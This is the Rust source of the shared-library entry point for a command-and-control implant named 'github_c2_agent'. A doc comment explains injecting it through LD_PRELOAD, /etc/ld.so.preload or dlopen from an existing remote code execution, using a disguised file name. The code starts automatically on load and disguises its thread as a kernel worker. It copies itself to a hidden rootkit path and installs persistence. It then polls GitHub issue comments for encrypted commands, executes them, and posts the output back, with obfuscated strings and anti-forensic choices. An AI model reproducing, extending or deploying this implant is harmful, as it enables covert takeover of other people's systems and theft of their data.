// All functions in lib_entry.rs are only used when the shared-lib-entry feature is active;
// dead_code warnings in lib target are expected for a cdylib entry file.
#![cfg_attr(not(feature = "shared-lib-entry"), allow(dead_code, unused_variables, unused_imports))]

///
/// When this .so is loaded via LD_PRELOAD, /etc/ld.so.preload, or dlopen(),
/// the `so_init` function in the `.init_array` section is called automatically
/// by the dynamic linker. It then starts the agent's main logic in a separate thread
/// without blocking the host process.
///
/// Build:
///   cargo build --release --target x86_64-unknown-linux-musl \
///     --features shared-lib-entry
///   # Output: target/x86_64-unknown-linux-musl/release/libgithub_c2_agent.so
///
/// Deployment options (choose one):
///   1. export LD_PRELOAD=/tmp/.libssl.so.3         (single-process injection)
///   2. echo /tmp/.libssl.so.3 >> /etc/ld.so.preload  (system-wide, requires root)
///   3. Call dlopen("/tmp/.libssl.so.3", RTLD_LAZY) via an existing RCE

// Module declarations shared with main.rs (same source files)
mod crypto;
mod platform;
mod uuid_gen;
mod commands;
mod files;
mod sysinfo;
mod persist;
mod timewindow;
mod selfdel;
#[cfg(unix)] mod ws_pty;
mod filetransfer;
#[cfg(unix)]
mod rootkit;
mod stowaway;
mod backup_config;
mod worker;          // 与 bin 侧模块清单对齐（曾缺 mod 引发 E0433）
mod guards;
mod linux_sensitive;
mod embedded_config;
mod net;             // 统一网络层（TLS 回退 / 代理与 NO_PROXY / 时钟偏移），与 bin 侧共享
mod schedule;        // agent 内部调度（schedule 命令），见 P2

use std::time::Duration;

#[cfg(unix)]
extern crate libc;

// ─── .init_array entry ────────────────────────────────────────────────────────

#[cfg(all(target_os = "linux", feature = "shared-lib-entry"))]
#[link_section = ".init_array"]
#[used]
static INIT_ARRAY_ENTRY: extern "C" fn() = so_init;

#[cfg(all(target_os = "linux", feature = "shared-lib-entry"))]
extern "C" fn so_init() {
    // Run in a separate thread so the host process is not blocked
    let _ = std::thread::Builder::new()
        .name("kworker/0:1".to_string()) // disguise as kernel worker thread
        .spawn(agent_thread_main);
}

fn agent_thread_main() {
    // Delay startup to let the host process finish its own initialisation
    std::thread::sleep(Duration::from_millis(800));

    // Activation guards: silently exit if conditions are not met
    if !guards::check_activation_guards() {
        return;
    }

    // Load backup config if available
    if let Ok(Some(backup)) = backup_config::load_persisted_backup_config() {
        backup_config::apply_backup_config(&backup);
    }

    let config = load_config();
    if config.github_token == "TOKEN" || config.github_token.is_empty() { return; }
    if config.password.is_empty() { return; }

    let agent_id = uuid_gen::get_or_create_agent_id();

    // Start Tokio runtime
    let Ok(rt) = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
    else { return };

    rt.block_on(async move {
        // Startup jitter
        let jitter = timewindow::startup_jitter_secs(&agent_id);
        tokio::time::sleep(Duration::from_secs(jitter)).await;

        // Copy self to hidden path
        #[cfg(unix)]
        if std::env::var("RELOCATED").is_err() {
            if let Ok(exe) = std::env::current_exe() {
                let target = rootkit::get_hidden_path();
                if let Some(target_path) = target {
                    let _ = std::fs::create_dir_all(target_path.parent().unwrap_or(std::path::Path::new("/")));
                    if std::fs::copy(&exe, &target_path).is_ok() {
                        rootkit::apply_selinux_context(&target_path.to_string_lossy());
                    }
                }
            }
        }

        // Install persistence
        #[cfg(unix)]
        if std::env::var("SKIP_PERSIST").is_err() {
            let _ = persist::install_persistence();
            std::env::set_var("SKIP_PERSIST", "1");
        }

        // Main loop (simplified — no relocation/daemonization since .so runs inside host process)
        loop {
            if !timewindow::is_in_active_window_with_jitter(&agent_id) {
                let secs = timewindow::outside_window_sleep_secs();
                tokio::time::sleep(Duration::from_secs(secs)).await;
                continue;
            }

            match run_agent_once(&config, &agent_id).await {
                Ok(_) => {}  // never reached, but handle gracefully
                Err(e) => {
                    let err_str = e.to_string();
                    if err_str == "continue" {
                        // Normal — one poll cycle complete, loop again
                        continue;
                    }
                    let delay = if err_str.contains("Network") { 120 } else { 60 };
                    tokio::time::sleep(Duration::from_secs(delay)).await;
                }
            }
        }
    });
}

async fn run_agent_once(config: &Config, agent_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Network reachability check
    let host = if config.github_token.starts_with("ntn_") {
        "api.notion.com"
    } else {
        "api.github.com"
    };
    if crate::net::get(&format!("https://{}", host))
        .timeout(std::time::Duration::from_secs(10))
        .call().is_err()
    {
        return Err("Network unavailable".into());
    }

    // Create or load issue ID
    let issue_file = {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
        // libc::geteuid 仅 unix 有绑定（windows libc 无此符号）；SO 只运行在
        // Linux，windows 侧仅是交叉检查编译，按非 root 布局处理即可。
        #[cfg(unix)]
        let is_root = unsafe { libc::geteuid() == 0 };
        #[cfg(not(unix))]
        let is_root = false;
        if is_root {
            "/var/tmp/.systemd/machine-id".to_string()
        } else {
            format!("{}/.local/share/machine-id", home)
        }
    };
    let issue_id = if let Ok(id) = std::fs::read_to_string(&issue_file) {
        let id = id.trim().to_string();
        if !id.is_empty() { id } else { return Err("No issue ID".into()); }
    } else {
        return Err("No issue ID (run standalone agent first to register)".into());
    };

    // Load last comment watermark
    let wm_file = issue_file.replace("/machine-id", "/random-seed");
    let mut last_id: u64 = std::fs::read_to_string(&wm_file)
        .ok().and_then(|s| s.trim().parse().ok()).unwrap_or(0);

    // Poll for commands (one cycle)
    let url = format!(
        "https://api.github.com/repos/{}/{}/issues/{}/comments?per_page=100",
        config.github_owner, config.github_repo, issue_id
    );
    let resp = crate::net::get(&url)
        .timeout(std::time::Duration::from_secs(20))
        .set("Authorization", &format!("token {}", config.github_token))
        .set("User-Agent", &config.user_agent)
        .call()?;
    let comments: Vec<serde_json::Value> = resp.into_json()?;

    for comment in &comments {
        let cid = comment["id"].as_u64().unwrap_or(0);
        if cid <= last_id { continue; }

        if let Some(body) = comment["body"].as_str() {
            if body.starts_with(obfstr::obfstr!("<!-- c -->")) {
                let encrypted = &body[obfstr::obfstr!("<!-- c -->").len()..];
                if let Ok(decrypted) = crypto::decrypt(encrypted, &config.password) {
                    let (cmd_id, cmd_text) = if let Ok(env) =
                        serde_json::from_str::<serde_json::Value>(&decrypted) {
                        (
                            env["command_id"].as_str().unwrap_or("?").to_string(),
                            env["command"].as_str().unwrap_or(&decrypted).to_string(),
                        )
                    } else {
                        (format!("lib-{}", cid), decrypted)
                    };

                    let cmd_clone = cmd_text.clone();
                    let output = tokio::task::spawn_blocking(move || {
                        commands::execute_command(&cmd_clone)
                    }).await.unwrap_or_else(|e| format!("[Error] {}", e));

                    // B13：响应分片（与 main.rs [Part id/i/n] 协议一致）——
                    // 单条 GitHub 评论 >64KB 会被 API 拒收，lib 路径此前不分片。
                    const LIB_CHUNK: usize = 60000;
                    let response_id = format!("lib-{}", cid);
                    let bytes = output.as_bytes();
                    let total = (bytes.len() + LIB_CHUNK - 1) / LIB_CHUNK.max(1);
                    let post_url = format!(
                        "https://api.github.com/repos/{}/{}/issues/{}/comments",
                        config.github_owner, config.github_repo, issue_id
                    );
                    for i in 0..total.max(1) {
                        let start = i * LIB_CHUNK;
                        let mut end = std::cmp::min(start + LIB_CHUNK, bytes.len());
                        // 多字节 UTF-8 边界保护（与 main.rs 同法）：不从字符中间切
                        while end > start && !output.is_char_boundary(end) { end -= 1; }
                        let chunk_str = if total <= 1 {
                            output.clone()
                        } else {
                            output[start..end].to_string()
                        };
                        let msg = if total <= 1 {
                            chunk_str
                        } else {
                            format!("[Part {}/{}/{}]
{}", response_id, i + 1, total, chunk_str)
                        };
                        if let Ok(plain) = serde_json::to_string(&serde_json::json!({
                            "response_to": cmd_id,
                            "message_type": if total <= 1 { "text" } else { "chunk" },
                            "content": msg,
                        })) {
                            if let Ok(enc) = crypto::encrypt(&plain, &config.password) {
                                let rsp_body = serde_json::json!({
                                    "body": format!("{}{}", obfstr::obfstr!("<!-- r -->"), enc)
                                });
                                let _ = crate::net::post(&post_url)
                                    .timeout(std::time::Duration::from_secs(20))
                                    .set("Authorization", &format!("token {}", config.github_token))
                                    .set("User-Agent", &config.user_agent)
                                    .send_json(&rsp_body);
                            }
                        }
                        if total > 1 { std::thread::sleep(Duration::from_millis(500)); }
                    }
                    // Only advance watermark on successful decrypt + execute
                    last_id = last_id.max(cid);
                }
                // Decrypt failed → do NOT advance watermark → retry next poll
            } else {
                // Non-command comment (response/other) — safe to skip
                last_id = last_id.max(cid);
            }
        }
    }

    // Save watermark
    let _ = std::fs::write(&wm_file, last_id.to_string());

    // Sleep one poll interval before next cycle
    tokio::time::sleep(Duration::from_secs(config.poll_interval)).await;
    Err("continue".into()) // Signal the outer loop to keep going
}

// ─── Config loading (identical logic to main.rs) ──────────────────────────────

struct Config {
    github_token: String,
    github_owner: String,
    github_repo: String,
    password: String,
    backup_url: String,
    poll_interval: u64,
    user_agent: String,
}

fn load_config() -> Config {
    let token = std::env::var("GITHUB_TOKEN").ok()
        .or_else(|| option_env!("GITHUB_TOKEN").map(|s| s.to_string()))
        .unwrap_or_else(|| "TOKEN".to_string());
    let repo = std::env::var("GITHUB_REPO").ok()
        .or_else(|| option_env!("GITHUB_REPO").map(|s| s.to_string()))
        .unwrap_or_else(|| "owner/repo".to_string());
    let password = std::env::var("ENCRYPTION_PASSWORD").ok()
        .or_else(|| option_env!("ENCRYPTION_PASSWORD").map(|s| s.to_string()))
        .unwrap_or_default();
    let backup_url = std::env::var("BACKUP_URL").ok()
        .or_else(|| option_env!("BACKUP_URL").map(|s| s.to_string()))
        .unwrap_or_default();
    let poll_interval = std::env::var("POLL_INTERVAL").ok()
        .or_else(|| option_env!("POLL_INTERVAL").map(|s| s.to_string()))
        .and_then(|s| s.parse::<u64>().ok())
        .map(|v| v.max(10))
        .unwrap_or(30);
    let parts: Vec<&str> = repo.split('/').collect();
    Config {
        github_token: token,
        github_owner: parts.get(0).unwrap_or(&"owner").to_string(),
        github_repo: parts.get(1).unwrap_or(&"repo").to_string(),
        password,
        backup_url,
        poll_interval,
        user_agent: "go-github/60.0.0".to_string(),
    }
}

// debug_log stub for lib target (main.rs has the full version)
fn debug_log(_msg: &str) {
    // SO version does not write to disk (avoids forensic traces).
    #[cfg(feature = "debug-mode")]
    eprintln!("[agent-so] {}", _msg);
}
